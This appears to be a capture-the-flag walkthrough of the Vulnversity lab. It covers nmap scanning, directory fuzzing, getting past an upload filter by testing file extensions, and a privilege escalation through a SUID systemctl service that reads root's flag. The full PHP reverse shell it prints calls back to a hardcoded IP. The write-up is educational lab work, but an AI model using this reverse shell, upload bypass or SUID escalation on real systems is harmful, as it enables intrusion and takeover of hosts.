    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/FREEBSD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/DEBIAN-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/	*EXPLOIT*
    |     	MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/	*EXPLOIT*
    |     	MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	6.8	https://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/	*EXPLOIT*
    |     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	6.8	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
    |     	CVE-2022-22721	6.8	https://vulners.com/cve/CVE-2022-22721
    |     	CVE-2021-40438	6.8	https://vulners.com/cve/CVE-2021-40438
    |     	CVE-2020-35452	6.8	https://vulners.com/cve/CVE-2020-35452
    |     	CVE-2018-1312	6.8	https://vulners.com/cve/CVE-2018-1312
    |     	CVE-2017-15715	6.8	https://vulners.com/cve/CVE-2017-15715
    |     	4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	6.8	https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332	*EXPLOIT*
    |     	CVE-2021-44224	6.4	https://vulners.com/cve/CVE-2021-44224
    |     	CVE-2019-10082	6.4	https://vulners.com/cve/CVE-2019-10082
    |     	CVE-2017-9788	6.4	https://vulners.com/cve/CVE-2017-9788
    |     	MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	6.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/	*EXPLOIT*
    |     	CVE-2019-0217	6.0	https://vulners.com/cve/CVE-2019-0217
    |     	CVE-2020-1927	5.8	https://vulners.com/cve/CVE-2020-1927
    |     	CVE-2019-10098	5.8	https://vulners.com/cve/CVE-2019-10098
    |     	1337DAY-ID-33577	5.8	https://vulners.com/zdt/1337DAY-ID-33577	*EXPLOIT*
    |     	CVE-2016-5387	5.1	https://vulners.com/cve/CVE-2016-5387
    |     	SSV:96537	5.0	https://vulners.com/seebug/SSV:96537	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2018-1333/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2018-1303/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1303/	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15710/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2020-1934/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15710/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15710/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	5.0	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2016-8743/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15710/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15710/	*EXPLOIT*
    |     	MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	5.0	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15710/	*EXPLOIT*
    |     	MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	5.0	https://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/HTTP/APACHE_OPTIONSBLEED	*EXPLOIT*
    |     	EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	5.0	https://vulners.com/exploitpack/EXPLOITPACK:C8C256BE0BFF5FE1C0405CB0AA9C075D	*EXPLOIT*
    |     	EXPLOITPACK:2666FB0676B4B582D689921651A30355	5.0	https://vulners.com/exploitpack/EXPLOITPACK:2666FB0676B4B582D689921651A30355	*EXPLOIT*
    |     	EDB-ID:42745	5.0	https://vulners.com/exploitdb/EDB-ID:42745	*EXPLOIT*
    |     	EDB-ID:40909	5.0	https://vulners.com/exploitdb/EDB-ID:40909	*EXPLOIT*
    |     	CVE-2022-22719	5.0	https://vulners.com/cve/CVE-2022-22719
    |     	CVE-2021-34798	5.0	https://vulners.com/cve/CVE-2021-34798
    |     	CVE-2021-33193	5.0	https://vulners.com/cve/CVE-2021-33193
    |     	CVE-2021-26690	5.0	https://vulners.com/cve/CVE-2021-26690
    |     	CVE-2020-1934	5.0	https://vulners.com/cve/CVE-2020-1934
    |     	CVE-2019-17567	5.0	https://vulners.com/cve/CVE-2019-17567
    |     	CVE-2019-0220	5.0	https://vulners.com/cve/CVE-2019-0220
    |     	CVE-2019-0196	5.0	https://vulners.com/cve/CVE-2019-0196
    |     	CVE-2018-17199	5.0	https://vulners.com/cve/CVE-2018-17199
    |     	CVE-2018-17189	5.0	https://vulners.com/cve/CVE-2018-17189
    |     	CVE-2018-1333	5.0	https://vulners.com/cve/CVE-2018-1333
    |     	CVE-2018-1303	5.0	https://vulners.com/cve/CVE-2018-1303
    |     	CVE-2017-9798	5.0	https://vulners.com/cve/CVE-2017-9798
    |     	CVE-2017-15710	5.0	https://vulners.com/cve/CVE-2017-15710
    |     	CVE-2016-8743	5.0	https://vulners.com/cve/CVE-2016-8743
    |     	CVE-2016-8740	5.0	https://vulners.com/cve/CVE-2016-8740
    |     	CVE-2016-4979	5.0	https://vulners.com/cve/CVE-2016-4979
    |     	1337DAY-ID-28573	5.0	https://vulners.com/zdt/1337DAY-ID-28573	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	4.9	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-0197/	*EXPLOIT*
    |     	CVE-2019-0197	4.9	https://vulners.com/cve/CVE-2019-0197
    |     	MSF:ILITIES/UBUNTU-CVE-2018-1302/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1302/	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2018-1301/	4.3	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1301/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	4.3	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2016-4975/	*EXPLOIT*
    |     	MSF:ILITIES/DEBIAN-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-10092/	*EXPLOIT*
    |     	MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2020-11985/	*EXPLOIT*
    |     	MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	4.3	https://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2019-10092/	*EXPLOIT*
    |     	CVE-2020-11985	4.3	https://vulners.com/cve/CVE-2020-11985
    |     	CVE-2019-10092	4.3	https://vulners.com/cve/CVE-2019-10092
    |     	CVE-2018-1302	4.3	https://vulners.com/cve/CVE-2018-1302
    |     	CVE-2018-1301	4.3	https://vulners.com/cve/CVE-2018-1301
    |     	CVE-2018-11763	4.3	https://vulners.com/cve/CVE-2018-11763
    |     	CVE-2016-4975	4.3	https://vulners.com/cve/CVE-2016-4975
    |     	CVE-2016-1546	4.3	https://vulners.com/cve/CVE-2016-1546
    |     	4013EC74-B3C1-5D95-938A-54197A58586D	4.3	https://vulners.com/githubexploit/4013EC74-B3C1-5D95-938A-54197A58586D	*EXPLOIT*
    |     	1337DAY-ID-33575	4.3	https://vulners.com/zdt/1337DAY-ID-33575	*EXPLOIT*
    |     	MSF:ILITIES/UBUNTU-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1283/	*EXPLOIT*
    |     	MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2018-1283/	*EXPLOIT*
    |     	MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2018-1283/	*EXPLOIT*
    |     	MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2018-1283/	*EXPLOIT*
    |     	MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1283/	*EXPLOIT*
    |     	MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	3.5	https://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2018-1283/	*EXPLOIT*
    |     	CVE-2018-1283	3.5	https://vulners.com/cve/CVE-2018-1283
    |     	CVE-2016-8612	3.3	https://vulners.com/cve/CVE-2016-8612
    |_    	PACKETSTORM:152441	0.0	https://vulners.com/packetstorm/PACKETSTORM:152441	*EXPLOIT*
    Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: false
    | smb-vuln-regsvc-dos: 
    |   VULNERABLE:
    |   Service regsvc in Microsoft Windows systems vulnerable to denial of service
    |     State: VULNERABLE
    |       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
    |       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
    |       while working on smb-enum-sessions.
    |_          

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 636.90 seconds
    ```
*   Questions

    > Question1: No answer is needed

    > Question2: Scan the box, how many ports are open?
    >
    > * answer: 6

    > Question3: What version of the squid proxy is running on the machine? we can see from the previous scan `squid HTTP proxy 3.5.12`
    >
    > * answer: 3.5.12

    > Question4: How many ports will nmap scan if the flag -p-400 was used? absolutely 400 🙂
    >
    > * answer: 400

    > Question4: Using the nmap flag -n what will it not resolve? we can use man nmap | grep -- -n\` to make sure its functionality if we forgot “n (No DNS resolution)”
    >
    > * answer: DNS

    > Question5: What is the most likely operating system this machine is running? we can see in apache service line it’s Ubuntu OS
    >
    > <img src="/assets/images/thm/Vulnversity/Untitled 2.png" alt="Untitled" data-size="original">
    >
    > * answer: ubuntu

    > Question6:What port is the web server running on?
    >
    > <img src="/assets/images/thm/Vulnversity/Untitled 3.png" alt="Untitled" data-size="original">
    >
    > * answer: 3333

    > Question7:Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background) No answer needed

***

## Locating directories using GoBuster

* Let’s browse the website
*   note that HTTP service running on port 3333, not 80, so you should tell your web browser that by typing targetIP:3333 instead of targetIP in the URL

    <img src="/assets/images/thm/Vulnversity/Untitled 4.png" alt="Untitled" data-size="original">
* Great, Let’s fuzz
* I prefer ffuf, so I will use it first because it’s so fast
*   Don’t forget to specify the port number “3333”

    <img src="/assets/images/thm/Vulnversity/Untitled 5.png" alt="Untitled" data-size="original">
* now we can use gobuster to locate directories
*   `gobuster dir --url http//TargetIp:3333 -w Wordlist`

    <img src="/assets/images/thm/Vulnversity/Untitled 6.png" alt="Untitled" data-size="original">
* as we can see gobuster and ffuf show the same result, but ffuf is faster than gobuster
*   Questions

    > Question1: no answer is needed

    > Question2: What is the directory that has an upload form page? I think it isn’t CSS or fonts or images or index.html or js or server-status let’s check what is internal
    >
    > <img src="/assets/images/thm/Vulnversity/Untitled 7.png" alt="Untitled" data-size="original">
    >
    > * yes it is an upload page
    > * answer: /internal

***

## Compromise the webserver

* Let’s try to upload a few file types
* we can see txt and PHP are blocked

![Untitled](</assets/images/thm/Vulnversity/Untitled 8.png>)

* instead of checking each extension manually, we are going to use Burp Suite Intruder
* start Burp Suite then intercept the request send it to the Intruder
*   select the extension then press “Add§”

    <img src="/assets/images/thm/Vulnversity/Untitled 9.png" alt="Untitled" data-size="original">
*   file extension payload

    ```
    php2
    php3
    php4
    php5
    php6
    php7
    phar 
    phtml
    phtm
    phps
    shtml
    ```
*   Start attack

    <img src="/assets/images/thm/Vulnversity/Untitled 10.png" alt="Untitled" data-size="original">

    *   we can see that “phtml” is the only response with different Length, so let’s check the response content

        <img src="/assets/images/thm/Vulnversity/Untitled 11.png" alt="Untitled" data-size="original">

        * Great😃, successful upload
* we have discovered that the server running is apache, so we should use PHP reverse shell
* we can find a reverse shell in “/usr/share/webshells/php" in kali Linux or we can use [pentestmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) or [payloadallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#php)
* I will use PHP reverse shell in /usr/share/webshells/php kali Linux

```php
php-reverse-shell.php                  
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.11.63.222';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

*   start a Netcat listener

    <img src="/assets/images/thm/Vulnversity/Untitled 12.png" alt="Untitled" data-size="original">
* change the IP and the port number in the reverse shell to your IP and listening port
*   change the file extension to phtml so we can upload it

    <img src="/assets/images/thm/Vulnversity/Untitled 13.png" alt="Untitled" data-size="original">
*   upload the file

    <img src="/assets/images/thm/Vulnversity/Untitled 14.png" alt="Untitled" data-size="original">
*   we don’t know the location of uploaded files so we will fuzz the website to find “juba.phtml”

    <img src="/assets/images/thm/Vulnversity/Untitled 15.png" alt="Untitled" data-size="original">

    * it seems that “uploads” directory is what we are looking for
    *   add our file name “juba” to the wordlist then try to fuzz again

        <img src="/assets/images/thm/Vulnversity/Untitled 16.png" alt="Untitled" data-size="original">

        *   when ffuf found juba the reverse shell started and connected to our listener

            <img src="/assets/images/thm/Vulnversity/Untitled 17.png" alt="Untitled" data-size="original">

            * Great 🙂
*   Questions

    > Question1: Try upload a few file types to the server, what common extension seems to be blocked?
    >
    > * answer: PHP

    > Question2: No answer needed

    > Question3: Run this attack, what extension is allowed?
    >
    > * answer: phtml

    > Question4: No answer needed

    > Question5: What is the name of the user who manages the webserver? let’s check /etc/passwd
    >
    > <img src="/assets/images/thm/Vulnversity/Untitled 18.png" alt="Untitled" data-size="original">
    >
    > bill is a non-Default account
    >
    > * answer: bill

    > Question 6: What is the user flag?
    >
    > <img src="/assets/images/thm/Vulnversity/Untitled 19.png" alt="Untitled" data-size="original">
    >
    > * Get your flag by yourself

***

## Stabilizing our shell

* first, check if python is installed

`$ which python /usr/bin/python`

* great it is installed
* let’s spawn the shell using `python -c "from pty import spawn; spawn('/bin/bash')`
* set TERM environment variable using `export TERM=xterm` this will give us access to term commands such as `clear`.
* background the reverse shell using CTRL + Z then type `stty raw -echo ; fg` This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.

![Untitled](</assets/images/thm/Vulnversity/Untitled 20.png>)

***

## Privilege Escalation

*   search for SUID and SGID files `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`

    <img src="/assets/images/thm/Vulnversity/Untitled 21.png" alt="Untitled" data-size="original">
* we can see that /bin/systemctl is a SUID file, so we can create a systemctl service and run it with root privilege
* let’s check how to do this in [GTFObins](https://gtfobins.github.io/gtfobins/systemctl/)
* first, create a file and store it in “flag” variable
* create a Service file and store it in “flag” variable
  * ExecStart=”what we want”
  * in our case we make the service get the content of root.txt file and redirect it to /tmp/flag.txt
* create a link to the file

```bash
flag=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag.txt"
[Install]
WantedBy=multi-user.target' > $flag
/bin/systemctl link $flag
/bin/systemctl enable --now $flag
```

![Untitled](</assets/images/thm/Vulnversity/Untitled 22.png>)

***

